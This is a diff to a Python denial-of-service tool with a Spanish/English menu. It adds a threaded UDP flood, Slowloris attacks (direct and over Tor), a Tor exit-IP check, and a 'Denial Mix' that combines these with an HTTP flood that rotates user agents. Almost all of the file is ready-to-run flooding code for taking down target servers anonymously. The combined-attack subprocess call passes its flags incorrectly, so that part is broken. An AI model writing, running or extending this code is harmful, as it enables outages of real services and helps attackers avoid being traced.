@@ -1,12 +1,15 @@
 import threading
-import requests
+import requests # type: ignore
 import os
 import sys
-from pystyle import Colorate, Colors
+from pystyle import Colorate, Colors # type: ignore
+import random
+import socket
+import subprocess
 
-banner ="""
+banner = """
   .=====================.
-  |G GATEWAY2000 /P5-90/|
+  |  GATEWAY2000 /P5-90/|
   |.-------------------.|
   ||[ _ o     . .  _ ]_||
   |`-------------------'|
@@ -33,26 +36,82 @@ banner ="""
   |||||||||||||||||dxm|||
   |||||||||||||||||||||||
   |=====================|
-     Create by: 74lg0
+    Created by => 74lg0
 """
+
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def ip_server():
+    try:
+        proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
+        ip = response.json().get('origin')
+        return ip
+    except Exception:
+        return 'Error server tor'
 
 def make_request(url, user_agent, option):
     try:
         if option == 1:
             headers = {'User-Agent': user_agent}
-            response = requests.get(url, headers=headers)
+            response = requests.get(url, headers=headers, timeout=1)
             print(f"Response Code: {response.status_code}")
         elif option == 2:
-            proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
             headers = {'User-Agent': user_agent}
-            response = requests.get(url, headers=headers, proxies=proxies)
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
             print(f'Response Code: {response.status_code}')
-    except Exception as e:
+        
+        elif option == 6:
+            headers = {'User-Agent': user_agent}
+            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
+
+    except requests.exceptions.RequestException as e:
         print(Colorate.Horizontal(Colors.green_to_blue, f"Failed to make request to {url}: {str(e)}"))
         sys.exit()
+
+def send_packets(ip, port, t_count):
+    bytes_to_send = random._urandom(1500)
+    threads = []
+
+    def send():
+        pack = 0
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            pack = pack + 1
+            print(f'Paquete {pack} enviado con exito...')
+            s.sendto(bytes_to_send, (ip, port))
+
+    for i in range(t_count):
+        thread = threading.Thread(target=send)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+def udp_mix(ip, port, t_count):
+    bytes_to_send = random._urandom(1500)
+    threads = []
+
+    def send():
+        pack = 0
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            pack = pack + 1
+            s.sendto(bytes_to_send, (ip, port))
+
+    for i in range(t_count):
+        thread = threading.Thread(target=send)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
 
 def main(url, option):
     user_agents = [
@@ -84,38 +143,83 @@ def main(url, option):
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
         'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36  uacq'
     ]
-    
+
     threads = []
     for ua in user_agents:
         thread = threading.Thread(target=make_request, args=(url, ua, option))
         threads.append(thread)
         thread.start()
-    
+
     for thread in threads:
         thread.join()
+
 
 if __name__ == '__main__':
     clear_console()
     print(Colorate.Horizontal(Colors.red_to_blue, banner))
-    print(Colorate.Horizontal(Colors.green_to_yellow, '[1] Normal Attack\n[2] Anonymous TOR Attack'))
+    IP_public_server = ip_server()
+    print(Colorate.Horizontal(Colors.rainbow, f'Tor Server IP => {IP_public_server}'))    
+    print(Colorate.Horizontal(Colors.green_to_yellow, '\n[1] Normal Attack\n[2] Anonymous TOR Attack\n[3] UDP Sock Attack\n[4] Slowloris Attack\n[5] Slowloris TOR\n[6] Denial Mix'))
+
     try:
-        option = int(input(Colorate.Horizontal(Colors.green_to_yellow,'=> ')))
+        option = int(input(Colorate.Horizontal(Colors.green_to_yellow, '=> ')))
+
         if option == 1 or option == 2:
             url = input(Colorate.Horizontal(Colors.green_to_yellow, 'URL => '))
             # Validación de la URL
             if not url.startswith(('https://', 'http://')):
                 url = 'http://' + url
-            try:
-                while True:
-                    main(url, option)
-            except KeyboardInterrupt:
-                clear_console()
-                sys.exit()
+            while True:
+                main(url, option)
+
+        elif option == 3:
+            ip = input("IP (domain) => ")
+            port = int(input("Port => "))
+            t_count = int(input('Number of threads => '))
+            send_packets(ip, port, t_count)
+        
+        elif option == 4:
+            ip = input('IP (Domain) => ')
+            p = int(input('Port to Attack (Default 80) => '))
+            sc = int(input('Sockets Count => '))
+            os.system(f'python3 slowloris.py {ip} -p {p} -s {sc}')
+
+        elif option == 5:
+            ip = input('IP (Domain) => ')
+            p = int(input('Port to Attack => '))
+            sc = int(input('Socket Count => '))
+            os.system(f'python3 slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 {ip} -p {p} -s {sc}')
+        
+        elif option == 6:
+            ip = input('IP => ')
+            dm = input('Domain (ej. www.google.com) => ')
+            p = int(input('Port => '))
+            sc = int(input('Socket Count (Slowloris) => '))
+            t_count = int(input('Number of threads => '))
+
+            print('Slowloris Attack...')
+            slowloris_thread = threading.Thread(target=subprocess.run, args=(['python3', 'slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 ', ip, '-p', str(p), '-s', str(sc)],))
+            slowloris_thread.start()
+
+            print('HTTP-Flood Method...')
+            http_thread = threading.Thread(target=main, args=(dm, option))
+            http_thread.start()
+
+            print('UDP Method...')
+            udp_thread = threading.Thread(target=udp_mix, args=(ip, p, t_count))
+            udp_thread.start()
+
+            print('DoS Active...')
+            slowloris_thread.join()
+            http_thread.join()
+            udp_thread.join()
+
         else:
             print(Colorate.Horizontal(Colors.red_to_green, '!!Incorrect option!!'))
 
     except KeyboardInterrupt:
-        sys.exit()    
+        sys.exit()
 
     except Exception as e:
         print(Colorate.Horizontal(Colors.red_to_blue, f'!ERROR {str(e)}!'))
+        sys.exit()
